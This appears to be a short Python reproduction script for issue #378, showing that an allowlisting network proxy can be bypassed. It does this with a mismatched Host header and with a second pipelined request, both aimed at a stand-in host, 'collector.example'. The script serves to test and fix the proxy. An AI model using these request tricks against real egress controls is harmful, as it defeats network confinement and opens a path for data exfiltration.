"""#378 closed-network/proxy.py: the allowlist reads the host of the first request's URL; the
host that answers reads the Host header, of that request and of every later one on the
connection. The answering side is Go's net/http, as a front serving many names would be."""
import json, os, socket, subprocess, sys, time
W = "/tmp/claude-0/closed"; os.makedirs(W, exist_ok=True)
echo = os.environ.get("ECHO", "go/echo")  # go build -o go/echo go/echo.go
up = subprocess.Popen([echo, "18090"])
env = dict(os.environ, SOCK=W + "/p.sock", LOG=W + "/log.jsonl", ALLOW="registry.npmjs.org", MAP=json.dumps({"registry.npmjs.org:80": "127.0.0.1:18090"}))
for f in ("/p.sock", "/log.jsonl"):
    if os.path.exists(W + f): os.remove(W + f)
px = subprocess.Popen([sys.executable, sys.argv[1]], env=env); time.sleep(0.5)
def run(raw):
    s = socket.socket(socket.AF_UNIX); s.connect(W + "/p.sock"); s.sendall(raw); s.settimeout(2); out = b""
    try:
        while (d := s.recv(65536)): out += d
    except socket.timeout: pass
    return [l for l in out.split(b"\r\n") if l.startswith(b"{")]
print("Host header other than the URL's:", run(b"GET http://registry.npmjs.org/ HTTP/1.1\r\nHost: collector.example\r\nConnection: close\r\n\r\n"))
print("second request on the connection:", run(b"GET http://registry.npmjs.org/ HTTP/1.1\r\nHost: registry.npmjs.org\r\n\r\n"
                                                  b"GET http://collector.example/x HTTP/1.1\r\nHost: collector.example\r\nConnection: close\r\n\r\n"))
print("proxy log:", open(W + "/log.jsonl").read().strip().replace("\n", " | "))
px.kill(); up.kill()
